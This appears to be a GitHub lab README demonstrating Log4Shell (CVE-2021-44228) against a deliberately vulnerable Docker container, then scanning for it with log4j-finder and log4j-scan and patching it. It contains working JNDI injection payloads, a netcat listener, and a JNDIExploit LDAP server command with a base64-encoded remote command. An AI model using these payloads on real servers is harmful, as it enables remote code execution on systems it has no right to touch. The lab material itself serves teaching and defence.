# Log4J-Demo

## What is Log4J? 

- A logging tool, written in Java, that is commonly used in many applications across the internet

## Setting Up Environment

First get the vulnerable docker and run it using [^1]: 

```sh
docker pull ghcr.io/christophetd/log4shell-vulnerable-app:latest
docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
```

## Finding the Exploit 

The docker container will now be running on `localhost:8080`. Go there in *BurpSuit* and send the `GET` request to the repeater. The request should look something like this: 

```http
GET / HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Now we are going to see if the server is vulnerable to *Log4J*. First try changing the `HTTP` headers to the following `JNDI` command:

```
${jndi:ldaps//YOUR_IP:553}
```

We are now going to start listening on our local machine using *Netcat* to see if any of these headers worked: 

```sh
nc -lvnp 553
```

The `GET` request should now look something like this: 

```http
GET / HTTP/1.1
Host: localhost:8080
Cache-Control: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua-mobile: ${jndi:ldaps//YOUR_IP:553}
sec-ch-ua-platform: ${jndi:ldaps//YOUR_IP:553}
Upgrade-Insecure-Requests: ${jndi:ldaps//YOUR_IP:553}
User-Agent: ${jndi:ldaps//YOUR_IP:553}
Accept: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Site: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Mode: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-User: ${jndi:ldaps//YOUR_IP:553}
Sec-Fetch-Dest: ${jndi:ldaps//YOUR_IP:553}
Accept-Encoding: ${jndi:ldaps//YOUR_IP:553}
Accept-Language: ${jndi:ldaps//YOUR_IP:553}
Connection: close
```

> **NOTE:** you will need to put in the `JNDI` request one by one to see which `HTTP` header is vulnerable. 

None of these `HTTP` headers are vulnerable, you can now try putting in new one to see if any of those are vulnerable. This server happens to have a *Log4J* vulnerability on the `X-Api-Version` header. 

If you put the following response in the `HTTP` request, you should get a response in *Netcat*: 

```http
X-Api-Version: ${jndi:ldaps//YOUR_IP:553}
```

This tells you that the server is vulnerable to the exploit. 

## Exploitation 

We will be using a tool called [JNDIExploit](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) to exploit the server. This program contains a "`LDAP` & `HTTP` servers for exploiting insecure-by-default `Java JNDI API`". There is a `JAR` file provided in this repo called `LDAP-Server.jar` to run it, use the following command as a template to run the `LDAP` server: 

> 

```sh
java -jar LDAP-Server.jar -i YOUR_IP -p 8888
```

Once you start the `LDAP` server, we need to create a command to exploit the server. We will use the following as as a template: 

```http
X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/COMMAND_TO_EXECUTE_URL_ENCODED} 
```

For example the following command will add a file called `pwned` to the `/tmp` directory: 

```sh
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

> 📘 **Note**
>
> This can also be used *BurpSuite* by adding the following line to the original request: 
> ```http
> X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
> ```

Now you can execute any command you want. 

## Why this was such a big deal

The process we just did was very manual but a bot can easily be set up to do this. This is exactly what happened when the vulnerability was discovered. There were at least 10 major bot-nets were doing masscans for *Log4J* [^2]. Once you have all the vulnerable machines, you can then create a program that does remote code execution on the targets. 
## Are you suffereing from *Log4J*? 

One of the best resources for *Log4J* is [`NCSC-NL/log4shell` GitHub Page](https://github.com/NCSC-NL/log4shell). It contains detailed documentation on: 

- [Hunting](https://github.com/NCSC-NL/log4shell/blob/main/hunting/README.md)
- [Indicators of Compromise](https://github.com/NCSC-NL/log4shell/blob/main/iocs/README.md)
- [Detection & Mitigation](https://github.com/NCSC-NL/log4shell/blob/main/detection_mitigation/README.md)
- [Scanning](https://github.com/NCSC-NL/log4shell/blob/main/scanning/README.md)
- [Known Vulnerable Software](https://github.com/NCSC-NL/log4shell/blob/main/software/README.md)
- [Parsing Tools](https://github.com/NCSC-NL/log4shell/blob/main/tools/README.md)

We will be using 2 tools mentioned in this repository. 

### [1. log4j-finder](https://github.com/fox-it/log4j-finder)

[log4j-finder](https://github.com/fox-it/log4j-finder) "identifies `log4j2` libraries on your file system using a list of *known bad* and *known good* MD5 hashes of specific files". This means that it runs locally on the machine instead of scanning externally. To scan for the Log4J vulnerability, you will have to get into a terminal of the docker container. While the container is running, use the following command: 

```sh
docker exec -it vulnerable-app /bin/sh
```

Once you are in, you need to install `git` and `python3`:

```sh
apk add git python3
```

Then clone the repo and run the program: 

```sh
git clone https://github.com/fox-it/log4j-finder
cd log4j-finder
python3 log4j-finder.py / 
```

This will scan the entire system for any vulnerable packages. You should see an output similar to this after running it in the docker container: 

```
[2022-11-21 06:13:58] 8a6cfd959a94 Scanning: /
[2022-11-21 06:13:59] 8a6cfd959a94 VULNERABLE: /app/spring-boot-application.jar -> BOOT-INF/lib/log4j-core-2.14.1.jar -> org/apache/logging/log4j/core/net/JndiManager.class [f1d630c48928096a484e4b95ccb162a0: log4j 2.14.0 - 2.14.1]
[2022-11-21 06:13:59] 8a6cfd959a94 Finished scan, elapsed time: 0.91 seconds

Summary:
 Processed 51797 files and 5750 directories
 Scanned 23 files
  Found 1 vulnerable files
```

### [2. log4j-scan](https://github.com/fullhunt/log4j-scan) 

This tool can be used to externally scan for *Log4J*. It is an "open detection and scanning tool (Python) for discovering and fuzzing for Log4J vulnerability". Due to it's ability to scan many devices it's perfect for security professionals who manage large scale operations.  

> 🚧 **Bug in Code** 
>
> As outlined in [Issue #131](https://github.com/fullhunt/log4j-scan/issues/131), if you run the version directly from the GitHub page it will fail to run. Due to this, I have included the fix (changing `interact.sh` to `oast.fun`) in this repo named `log4j-scan.py`. Thank you [akr3ch](https://github.com/akr3ch) for figuring this out. 

To do an external scan on our container, type the following: 

```sh
python3 log4j-scan.py -u http://localhost:8080
```

You should see an output that looks like this: 

```
[•] CVE-2021-44228 - Apache Log4j RCE Scanner
[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
[•] Secure your External Attack Surface with FullHunt.io.
[•] Initiating DNS callback server (interact.sh).
[%] Checking for Log4j RCE CVE-2021-44228.
[•] URL: http://localhost:8080
[•] URL: http://localhost:8080 | PAYLOAD: ${jndi:ldap://localhost.858m2k2su8u8442396146322h0030f7np.oast.fun/w0aeksw}
[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
[•] Waiting...
[!!!] Targets Affected
{"timestamp": "2022-11-21T06:38:54.364668258Z", "host": "858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.74"}
{"timestamp": "2022-11-21T06:38:54.365665371Z", "host": "858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.75"}
{"timestamp": "2022-11-21T06:38:54.367763352Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "172.217.36.130"}
{"timestamp": "2022-11-21T06:38:54.576959288Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.74"}
{"timestamp": "2022-11-21T06:38:54.578630056Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.75"}
{"timestamp": "2022-11-21T06:38:54.67594304Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.74"}
{"timestamp": "2022-11-21T06:38:54.680139615Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.75"}
{"timestamp": "2022-11-21T06:38:54.890413322Z", "host": "858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.74"}
```

This means our server is vulnerable

## Fixing the Server

Our server is vulnerable. Not only have we been hacked but our internal and external scans show that we are vulnerable. As good practitioners of cybersecurity we need to patch this. 

First, we will update the docker container. Get back inside the docker container with: 

```sh
docker exec -it vulnerable-app /bin/sh
```

Inside the container, update the system: 

```sh 
apk update && apk upgrade
```

You then need to update the docker image with these changes. `exit` the container and run the following command your system’s terminal: 

```sh
sudo docker commit -a me vulnerable-app ghcr.io/christophetd/log4shell-vulnerable-app
```

After this, if you rerun the scanners, [log4j-scan](https://github.com/fullhunt/log4j-scan) will not detect a vulnerability but [log4j-finder](https://github.com/fox-it/log4j-finder) will. Although if you try and do the exploit with [JNDIExploit](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) it will not work. 

## Log4J Vulnerable Code Explained



## Sources  

### Directly Used

- [`NCSC-NL/log4shell` GitHub Page](https://github.com/NCSC-NL/log4shell)

### Tools 

- 

### Good to Know

- 

### Honorable Mentions 

- 

[^1]: [Docker container created by christophetd](https://github.com/christophetd/log4shell-vulnerabre-app) 
[^2]: [Ten families of malicious samples are spreading using the Log4j2 vulnerability Now](https://blog.netlab.360.com/ten-families-of-malicious-samples-are-spreading-using-the-log4j2-vulnerability-now/) 
